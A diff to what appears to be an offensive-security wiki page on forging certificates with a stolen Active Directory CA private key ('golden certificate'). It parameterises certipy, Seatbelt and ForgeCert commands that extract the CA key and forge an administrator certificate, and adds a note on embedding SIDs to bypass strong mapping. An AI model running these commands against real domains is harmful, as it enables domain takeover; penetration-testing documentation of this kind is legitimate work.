@@ -28,7 +28,7 @@ Extracting the DPAPI-protected CA cert private key can be done remotely from UNI
 
 
 ```bash
-certipy ca -backup -ca "CA" -username "USER@domain.local" -password "PASSWORD" -dc-ip "DC-IP"
+certipy ca -backup -ca "CA" -username "$USER@$DOMAIN" -password "$PASSWORD" -dc-ip "$DC_IP"
 ```
 
 
@@ -36,9 +36,11 @@ Then, forging (and signing) a certificate can be done as follows.
 
 
 ```bash
-certipy forge -ca-pfx "CA.pfx" -upn "administrator@corp.local" -subject "CN=Administrator,CN=Users,DC=CORP,DC=LOCAL"
+certipy forge -ca-pfx "CA.pfx" -upn "administrator@$DOMAIN" -subject "CN=Administrator,CN=Users,DC=CORP,DC=LOCAL"
 ```
 
+> [!WARNING]
+> On environments with post-May 2022 strong mapping enforcement (`StrongCertificateBindingEnforcement` set to `1` or `2`), forged certificates must include a valid `szOID_NTDS_CA_SECURITY_EXT` SID extension matching the impersonated principal. Use the `-sid` flag in `certipy forge` (e.g. `certipy forge -ca-pfx "CA.pfx" -upn "administrator@corp.local" -sid "S-1-5-..."`) to embed the correct SID.
 
 The certificate can then be used with [Pass the Certificate](../../movement/kerberos/pass-the-certificate.md).
 
@@ -48,7 +50,7 @@ The certificate can then be used with [Pass the Certificate](../../movement/kerb
 Extracting the DPAPI-protected CA cert private key can be done remotely with [Seatbelt](https://github.com/GhostPack/Seatbelt) (C#).
 
 ```powershell
-Seatbelt.exe Certificates -computername="ca.domain.local"
+Seatbelt.exe Certificates -computername="$CA_FQDN"
 ```
 
 Alternatively, the builtin `certsrv.msc` utility can be used locally on the CA server.
@@ -82,7 +84,7 @@ Then, forging and signing a certificate can be done with [ForgeCert](https://git
 
 
 ```powershell
-ForgeCert.exe --CaCertPath "ca.pfx" --CaCertPassword "Password" --Subject "CN=User" --SubjectAltName "administrator@domain.local" --NewCertPath "administrator.pfx" --NewCertPassword "Password"
+ForgeCert.exe --CaCertPath "ca.pfx" --CaCertPassword "Password" --Subject "CN=User" --SubjectAltName "administrator@$DOMAIN" --NewCertPath "administrator.pfx" --NewCertPassword "Password"
 ```
 
 
